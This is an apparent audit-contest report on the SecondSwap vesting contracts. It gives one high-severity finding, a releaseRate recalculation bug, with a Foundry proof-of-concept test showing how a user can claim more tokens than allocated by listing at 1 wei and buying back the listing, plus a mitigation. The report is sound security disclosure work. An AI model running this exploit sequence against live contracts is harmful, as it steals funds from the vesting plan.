+++
start-date = "2024-12-10"
end-date = "2024-9-10"
total-time = "NA"
author = "0xSolus"
+++

# Audit Contest Details 
[Second Swap](https://code4rena.com/audits/2024-12-secondswap)  


# Findings Summary

| ID     | Title                                                                               | Severity 
| ------ | ----------------------------------------------------------------------------------- | -------- 
| [H-01] | Incorrect calculation of releaseRate allows user to claim more funds than allocated | High     


# Detailed Findings

## [H-1] Incorrect calculation of releaseRate allows user to claim more funds than allocated.

### Summary
The `SecondSwap_StepVesting::transferVesting()` function incorrectly recalculates 
the `releaseRate` for the `_grantor` after transferring tokens. The calculation does 
not account for the tokens that have already been claimed `amountClaimed`. 
This allows a malicious user to increase the releaseRate, granting them access 
to claim more tokens than allocated.

### POC
[PoC](https://gist.github.com/noahfigueras/35b5a5dcff49c3490299218e1ad0d059)
```solidity
  function test_exploitVesting() public {
    // Attacker is the beneficiary of 100 tokens.
    address vestingPlan = _vestingDeployer(100e18);

    // We assume vestingPlan has some liquidity.
    vestingT.mint(address(vestingPlan), 100 ether);

    // User claims after 5 days - (gets 50 tokens back)
    vm.warp(block.timestamp + 5 days);
    vm.startPrank(attacker);
    SecondSwap_StepVesting v = SecondSwap_StepVesting(vestingPlan);
    v.claim(); 

    // We list 50 tokens for sale (maximum).
    marketplace.listVesting(
      vestingPlan,
      50e18,
      1, // Lower price possible 1 wei x token
      5000,
      SecondSwap_Marketplace.ListingType.SINGLE,
      SecondSwap_Marketplace.DiscountType.NO,
      5,
      address(usdt),
      1,
      false
    );

    // We can still claim some free tokens here as claim() doesn't check that we 
    // exceeded the maximum amount of tokens. 
    // In this case we can still claim (releaseRate * claimableSteps).
    // 5e18 * 4 = 20e18 (tokens for free)
    vm.warp(block.timestamp + 5 days - 500);
    v.claim();
    vm.stopPrank();

    // We buy our own listing with another address for 50 wei and we get 50 tokens back
    // NOTE: This will only work if buyer is another address due to the update
    // of vestings in _createVesting()
    vm.startPrank(attacker2);
    usdt.approve(address(marketplace), 100);
    marketplace.spotPurchase(vestingPlan, 0, 50e18, address(0x0));

    // We claim those tokens back
    vm.warp(block.timestamp + 1 days);
    v.claim();

    vm.stopPrank();

    // We end up with 20 more tokens
    totalTokens = vestingT.balanceOf(attacker) + vestingT.balanceOf(attacker2);
    console.log(totalTokens);
  }

```

### Mitigation
Consider checking for excess balance in `SecondSwap_StepVesting::claim()`.
```solidity
  function claim() external {
    (uint256 claimableAmount, uint256 claimableSteps) = claimable(msg.sender);
    require(claimableAmount > 0, "SS_StepVesting: nothing to claim");

    Vesting storage vesting = _vestings[msg.sender];
    vesting.stepsClaimed += claimableSteps;
    vesting.amountClaimed += claimableAmount;

    require(
      vesting.amountClaimed <= vesting.totalAmount,
      "SS_StepVesting: balance exceeded"
    );
    token.safeTransfer(msg.sender, claimableAmount); //  3.6. DOS caused by the use of transfer and transferFrom functions
    emit Claimed(msg.sender, claimableAmount);
  }

```


